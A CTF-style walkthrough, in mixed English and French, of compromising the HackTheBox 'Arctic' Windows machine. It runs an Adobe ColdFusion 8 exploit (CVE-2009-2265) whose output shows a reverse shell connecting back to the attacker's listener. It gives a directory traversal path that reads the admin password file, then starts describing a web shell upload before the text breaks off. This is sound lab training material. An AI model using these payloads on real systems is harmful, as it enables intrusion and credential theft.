---
title: Arctic - HacktheBox(Easy)
date: 2024-06-22
author: Habukhan
categories: [TryHackMe]
tags: [Hacking, CTFs, THM]
image: https://i.ibb.co/x2bNLDD/ar.jpg
---

* [The Best Academy to Learn Hacking.](https://account.hackthebox.com/register)
* [Beginner Friendly challenges on TryHackMe.](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)

# Arctic - HacktheBox(Easy)

Good evening again, I will present to you my writeup on the exploitation of a Level Windows Machine Facileon HacktheBox

Description:
* Arctic is pretty simple, but web server load times cause some operational issues. Basic troubleshooting is required for the exploit to work properly.

*  [The Best Academy to Learn Hacking.](https://account.hackthebox.com/register)
* Beginner Friendly challenges on TryHackMe [Here.](https://tryhackme.com/)

# Reconaissance

To start, I'm going to run a scan with my [nmapautonmap](https://github.com/nenandjabhata/CTFs-Journey/blob/main/Scripts/nmapauto.sh) tool .
```bash
─# /home/blo/tools/nmapautomate/nmapauto.sh $ip

###############################################
###---------) Starting Quick Scan (---------###
###############################################

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 18:24 CST
Initiating Ping Scan at 18:24
Scanning 10.129.136.143 [4 ports]
Completed Ping Scan at 18:24, 2.18s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:24
Completed Parallel DNS resolution of 1 host. at 18:24, 0.00s elapsed
Initiating SYN Stealth Scan at 18:24
Scanning 10.129.136.143 [1000 ports]
SYN Stealth Scan Timing: About 99.99% done; ETC: 18:28 (0:00:00 remaining)
Completed SYN Stealth Scan at 18:28, 231.60s elapsed (1000 total ports)
Nmap scan report for 10.129.136.143
Host is up (2.0s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

----------------------------------------------------------------------------------------------------------
Open Ports : 135,8500,49154                                                                                                                                                                  
--------------------------------
Service scan Timing: About 66.67% done; ETC: 18:33 (0:00:47 remaining)
Nmap scan report for 10.129.136.143
Host is up (0.58s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
With my scan, I only find 3 ports which are open on the Machine including:

* Ports 135 & 49154: qui execute le Microsoft Windows RPC
* Port 8500 : which it executes Flight Message Transfert Protocol(FMTP)

By visiting port 8500 , I land on this page

![Artic - HacktheBox](https://i.ibb.co/Fn05ncT/image-86.png)

In these two (2) directories, while searching I came across a page /administratorwhich sent me to a login

![Artic - HacktheBox](https://i.ibb.co/5T2jpnd/ad.png)

* In this one I find in the title Adobe ColdFusion 8 Administrator. so I'm looking for exploits on Googleand onSearchsploit

![Artic - HacktheBox](https://i.ibb.co/X7zytVy/cold.png)

With this search I find the exploit 50057.pyand I copy it locally. Reading the exploit I see that it is the CVE-2009-2265.

* I open the exploit in my Sublime texteto read it a little and modify it at the IPs level, then I launch

```bash
─# python3 coldfusion.py         

Generating a payload...
Payload size: 1496 bytes
Saved as: c39559fbd32947c597bc9bbc08db4a9f.jsp

Priting request...
Content-type: multipart/form-data; boundary=854f29a3ce9247d89abbcf5729ffc490
Content-length: 1697

--854f29a3ce9247d89abbcf5729ffc490
Content-Disposition: form-data; name="newfile"; filename="c39559fbd32947c597bc9bbc08db4a9f.txt"
Content-Type: text/plain


Printing some information for debugging...
lhost: 10.10.16.4
lport: 1337
rhost: 10.129.136.143
rport: 8500
payload: c39559fbd32947c597bc9bbc08db4a9f.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 1337 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.136.143] 49295
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

Now we have a non-privileged shell as tolisin the system. So we'll need to find a way to escalate privileges.
# Exploitation Manuelle(Directory Traversal )
By doing some research for manual exploitation and broadening my understanding, I found that this software is also vulnerable to a Directory Traversal Vulnerability

![Artic](https://i.ibb.co/NNBMZ6t/Screenshot-2024-02-29-at-19-04-46-Adobe-Cold-Fusion-Directory-Traversal.png)

From here I can see that we are told to send a request GETto the following PATH:/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en

By running this query on Burpsuite, we get a return of a crypt password l'administrateurinsha1

![Artic](https://i.ibb.co/z8kC1Zy/burp1.png)
So using it crackstationI manage to crack it

![Artic](https://i.ibb.co/NWB1H3h/Screenshot-2024-02-29-at-19-11-03-Crack-Station-Online-Password-Hash-Cracking-MD5-SHA1-Linux-Rainbow.png)

# Shell
Now that I am in the admin panel, I will then try to have a shell on the machine which hosts this site by injecting a CFMmalicious file which will help us to execute commands remotely. For this we must:

* First to find our payload in cfm, I did some research on Github and I came across this Payload then I copied it locally
* Go to the Settings tab on the left and click on the “Mappings” section.
* L’un des mappages par défaut est C:\ColdFusion8\wwwroot\CFIDE. C’est là que je vais ecrire mon shell donc je copy ce path

